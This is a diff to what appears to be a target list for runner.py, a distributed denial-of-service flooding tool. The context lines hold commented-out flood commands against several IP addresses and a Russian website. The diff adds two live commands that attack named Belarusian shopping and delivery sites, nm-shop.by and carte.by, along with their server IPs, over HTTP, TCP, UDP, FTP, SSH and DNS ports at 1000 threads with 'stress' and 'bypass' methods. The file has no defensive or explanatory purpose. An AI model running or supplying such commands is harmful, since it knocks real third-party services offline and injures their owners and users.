@@ -21,3 +21,7 @@ runner.py tcp://92.223.84.84:80 tcp://92.223.84.84:443 tcp://91.194.226.50:80 tc
 #runner.py https://www.vezetvsem.ru/ 89.108.106.50:80 89.108.106.50:443 https://89.108.106.50:443 tcp://89.108.106.50:22 tcp://89.108.106.50:80 tcp://89.108.106.50:443 -t 500 --http-methods get stress
 
 #runner.py tcp://185.106.172.117:53 tcp://185.106.172.117:80 tcp://185.106.173.65:53 tcp://185.106.173.65:80 tcp://185.106.175.109:53 tcp://185.106.175.109:80 tcp://185.106.175.72:53 tcp://185.106.175.72:80 -t 300 --http-methods TCP
+
+runner.py https://nm-shop.by/vitebsk/ http://nm-shop.by/vitebsk/ 178.172.136.190:80 178.172.136.190:443 178.172.136.190:21 178.172.136.190:22 https://178.172.136.190:443 tcp://178.172.136.190:22 tcp://178.172.136.190:21 tcp://178.172.136.190:53 udp://178.172.136.190:53 tcp://178.172.136.190:443 -t 1000 --http-methods get stress head bypass
+
+runner.py https://carte.by/source/front/api.js https://carte.by/minsk/hpl/export/ https://carte.by/vitebsk/dostavka/ 193.176.182.165:80 193.176.182.165:443 tcp://193.176.182.165:80 tcp://193.176.182.165:443 -t 1000 --http-methods get stress head
